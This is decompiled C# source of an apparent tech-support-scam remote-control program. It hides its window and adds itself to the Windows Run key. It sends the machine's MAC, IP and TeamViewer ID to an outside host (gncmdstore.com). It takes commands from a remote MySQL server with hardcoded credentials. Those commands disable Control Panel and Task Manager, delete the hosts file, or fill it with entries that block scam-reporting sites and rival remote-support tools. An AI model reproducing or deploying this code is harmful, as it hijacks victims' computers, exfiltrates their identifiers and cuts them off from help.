using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data.Common;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.Win32;
using MySql.Data.MySqlClient;

namespace hardworking;

public class Form2 : Form
{
	private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

	private MySqlConnection conn;

	private string sMacAddress = string.Empty;

	private string mac;

	private string pc_locked;

	private string Teamviewerstring = string.Empty;

	private string country = "JP";

	private string cp_disable;

	private string taskmanager;

	private string host_file;

	private string path;

	private string connString = "SERVER=107.180.3.171; PORT=3306; DATABASE=computer_details; UID=computer_details; PASSWORD=admin@password";

	private IntPtr ptrHook;

	private LowLevelKeyboardProc objKeyboardProcess;

	private IContainer components;

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr SetWindowsHookEx(int id, LowLevelKeyboardProc callback, IntPtr hMod, uint dwThreadId);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool UnhookWindowsHookEx(IntPtr hook);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr CallNextHookEx(IntPtr hook, int nCode, IntPtr wp, IntPtr lp);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr GetModuleHandle(string name);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern short GetAsyncKeyState(Keys key);

	public static bool ModifyHostsFile(string entry)
	{
		try
		{
			using StreamWriter streamWriter = File.AppendText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "drivers\\etc\\hosts"));
			streamWriter.WriteLine(entry);
			return true;
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
			return false;
		}
	}

	public Form2()
	{
		InitializeComponent();
		((Control)this).Hide();
		((Form)this).set_MinimizeBox(false);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_ControlBox(false);
		GetTeamviewerID();
		method_0();
		NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
		foreach (NetworkInterface networkInterface in allNetworkInterfaces)
		{
			if (sMacAddress == string.Empty)
			{
				networkInterface.GetIPProperties();
				sMacAddress = networkInterface.GetPhysicalAddress().ToString();
			}
		}
	}

	public static string GetTeamviewerID()
	{
		List<string> list = new string[7] { "4", "5", "5.1", "6", "7", "8", "14" }.Reverse().ToList();
		string[] array = new string[2] { "SOFTWARE\\TeamViewer", "SOFTWARE\\Wow6432Node\\TeamViewer" };
		foreach (string text in array)
		{
			if (Registry.LocalMachine.OpenSubKey(text) == null)
			{
				continue;
			}
			foreach (string item in list)
			{
				string name = $"{text}\\Version{item}";
				if (Registry.LocalMachine.OpenSubKey(name) != null)
				{
					object value = Registry.LocalMachine.OpenSubKey(name)!.GetValue("ClientID");
					if (value != null)
					{
						return Convert.ToInt32(value).ToString();
					}
				}
			}
		}
		return string.Empty;
	}

	private void Form2_Load(object sender, EventArgs e)
	{
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0085: Expected O, but got Unknown
		//IL_00f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fa: Expected O, but got Unknown
		//IL_0121: Unknown result type (might be due to invalid IL or missing references)
		RegistryKey? registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey!.SetValue("mac testing", Application.get_ExecutablePath().ToString());
		string empty = string.Empty;
		empty = Dns.GetHostName();
		Console.WriteLine("Local Machine's Host Name: " + empty);
		IPAddress[] addressList = Dns.GetHostEntry(empty).AddressList;
		string text = string.Empty;
		for (int i = 0; i < addressList.Length; i++)
		{
			text = addressList[i].ToString();
		}
		WebBrowser val = new WebBrowser();
		string currentDirectory = Directory.GetCurrentDirectory();
		val.set_Url(new Uri(string.Format("http://gncmdstore.com/api_update.php?id=" + sMacAddress + "& ip=" + text + "& TeamViewer_id=" + Teamviewerstring + "& country=" + country, currentDirectory)));
		val.set_ScriptErrorsSuppressed(true);
		conn = new MySqlConnection();
		((DbConnection)(object)conn).ConnectionString = connString;
		((DbConnection)(object)conn).Open();
		MySqlDataReader val2 = new MySqlCommand("select *from tbl_computer_details_user", conn).ExecuteReader();
		while (((DbDataReader)(object)val2).Read())
		{
			Console.WriteLine(string.Concat(((DbDataReader)(object)val2)["id"]));
			Console.WriteLine(string.Concat(((DbDataReader)(object)val2)["mac"]));
			mac = string.Concat(((DbDataReader)(object)val2)["mac"]);
			pc_locked = string.Concat(((DbDataReader)(object)val2)["pc_locked"]);
			cp_disable = string.Concat(((DbDataReader)(object)val2)["cp_disable"]);
			taskmanager = string.Concat(((DbDataReader)(object)val2)["task_manager"]);
			host_file = string.Concat(((DbDataReader)(object)val2)["host_file"]);
			if (string.Equals(mac, sMacAddress))
			{
				if (cp_disable == "1")
				{
					RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
					registryKey2.SetValue("NoControlPanel", true, RegistryValueKind.DWord);
					registryKey2.Close();
					RegistryKey registryKey3 = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
					registryKey3.SetValue("NoControlPanel", true, RegistryValueKind.DWord);
					registryKey3.Close();
				}
				if (cp_disable == "0")
				{
					RegistryKey registryKey4 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
					registryKey4.SetValue("NoControlPanel", false, RegistryValueKind.DWord);
					registryKey4.Close();
					RegistryKey registryKey5 = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
					registryKey5.SetValue("NoControlPanel", false, RegistryValueKind.DWord);
					registryKey5.Close();
				}
				if (taskmanager == "1")
				{
					Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System").SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
				}
				if (taskmanager == "0")
				{
					Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System").SetValue("DisableTaskMgr", 0, RegistryValueKind.DWord);
				}
				if (host_file == "1")
				{
					ModifyHostsFile("127.0.0.1     answers.microsoft.com" + Environment.NewLine + "127.0.0.1   www.scamadviser.com" + Environment.NewLine + "127.0.0.1   www.answers.microsoft.com" + Environment.NewLine + "127.0.0.1   www.reddit.com" + Environment.NewLine + "127.0.0.1   www.bbb.org" + Environment.NewLine + "127.0.0.1   reportscam.com" + Environment.NewLine + "127.0.0.1   it.findeen.com" + Environment.NewLine + "127.0.0.1   secure.logmeinrescue.com" + Environment.NewLine + "127.0.0.1   fastsupport.com" + Environment.NewLine + "127.0.0.1   www.fastsupport.com" + Environment.NewLine + "127.0.0.1   helpme.net" + Environment.NewLine + "127.0.0.1   www.helpme.net" + Environment.NewLine + "127.0.0.1   teamviewer.com" + Environment.NewLine + "127.0.0.1   www.teamviewer.com" + Environment.NewLine + "127.0.0.1   ammyy.com" + Environment.NewLine + "127.0.0.1   www.ammyy.com" + Environment.NewLine + "127.0.0.1   supremocontrol.com" + Environment.NewLine + "127.0.0.1   www.supercontrol.com" + Environment.NewLine + "127.0.0.1   gotoassist.com" + Environment.NewLine + "127.0.0.1   www.gotoassist.com" + Environment.NewLine + "127.0.0.1   anydesk.com" + Environment.NewLine + "127.0.0.1   www.anydesk.com" + Environment.NewLine + "127.0.0.1   aeroadmin.com" + Environment.NewLine + "127.0.0.1   www.aeroadmin.com" + Environment.NewLine + "127.0.0.1   remoteutilities.com" + Environment.NewLine + "127.0.0.1   www.remoteutilities.com" + Environment.NewLine + "127.0.0.1   remotepc.com" + Environment.NewLine + "127.0.0.1   www.remotepc.com" + Environment.NewLine + "127.0.0.1   litemanager.com" + Environment.NewLine + "127.0.0.1   www.litemanager.com" + Environment.NewLine + "127.0.0.1   get.gotomypc.com" + Environment.NewLine + "127.0.0.1   get.gotomypc.com" + Environment.NewLine + "127.0.0.1   showmypc.com" + Environment.NewLine + "127.0.0.1   www.showmypc.com" + Environment.NewLine + "127.0.0.1   www.join.me" + Environment.NewLine + "127.0.0.1   join.me" + Environment.NewLine + "127.0.0.1   skyfex.com" + Environment.NewLine + "127.0.0.1   www.skyfex.com" + Environment.NewLine + "127.0.0.1   bomgar.com" + Environment.NewLine + "127.0.0.1   www.bomgar.com" + Environment.NewLine + "127.0.0.1   zoho.com" + Environment.NewLine + "127.0.0.1   www.zoho.com" + Environment.NewLine + "127.0.0.1   uvnc.com" + Environment.NewLine + "127.0.0.1   www.uvnc.com" + Environment.NewLine + "127.0.0.1   webex.co.in" + Environment.NewLine + "127.0.0.1   www.webex.co.in" + Environment.NewLine + "127.0.0.1   gotomeeting.com" + Environment.NewLine + "127.0.0.1   www.gotomeeting.com" + Environment.NewLine + "127.0.0.1   webex.com" + Environment.NewLine + "127.0.0.1   www.webex.com" + Environment.NewLine + "127.0.0.1   realvnc.com" + Environment.NewLine + "127.0.0.1   www.realvnc.com" + Environment.NewLine + "127.0.0.1   nomachine.com" + Environment.NewLine + "127.0.0.1   www.nomachine.com" + Environment.NewLine + "127.0.0.1   thinstuff.com" + Environment.NewLine + "127.0.0.1   www.thinstuff.com" + Environment.NewLine + "127.0.0.1   splashtop.com" + Environment.NewLine + "127.0.0.1   www.splashtop.com" + Environment.NewLine + "127.0.0.1   parlelles.com" + Environment.NewLine + "127.0.0.1   www.parlelles.com" + Environment.NewLine + "127.0.0.1   deskroll.com" + Environment.NewLine + "127.0.0.1   www.deskroll.com" + Environment.NewLine + "127.0.0.1   alpemix.com" + Environment.NewLine + "127.0.0.1   www.alpemix.com" + Environment.NewLine + "127.0.0.1   www.lmi3.com" + Environment.NewLine + "127.0.0.1   lmi3.com" + Environment.NewLine + "127.0.0.1   ultraviewer.net" + Environment.NewLine + "127.0.0.1   www.ultraviewer.net");
				}
				if (host_file == "0")
				{
					path = "C:\\Windows\\System32\\drivers\\etc\\hosts";
					File.Delete(path);
				}
				if (pc_locked == "0")
				{
					((Control)new Form1()).Show();
				}
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(116, 0));
		((Control)this).set_Name("Form2");
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("C");
		((Form)this).set_WindowState((FormWindowState)1);
		((Form)this).add_Load((EventHandler)Form2_Load);
		((Control)this).ResumeLayout(false);
	}

	[CompilerGenerated]
	private long method_0()
	{
		//IL_008d: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string name = (Environment.Is64BitOperatingSystem ? "SOFTWARE\\Wow6432Node\\TeamViewer" : "SOFTWARE\\TeamViewer");
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(name);
			if (registryKey == null)
			{
				return 0L;
			}
			object value = registryKey.GetValue("ClientID");
			Teamviewerstring = value.ToString();
			if (value != null)
			{
				return Convert.ToInt64(value);
			}
			foreach (string item in registryKey.GetSubKeyNames().Reverse())
			{
				value = registryKey.OpenSubKey(item)!.GetValue("ClientID");
				MessageBox.Show(value.ToString());
				if (value != null)
				{
					return Convert.ToInt64(value);
				}
			}
			return 0L;
		}
		catch (Exception)
		{
			return 0L;
		}
	}
}
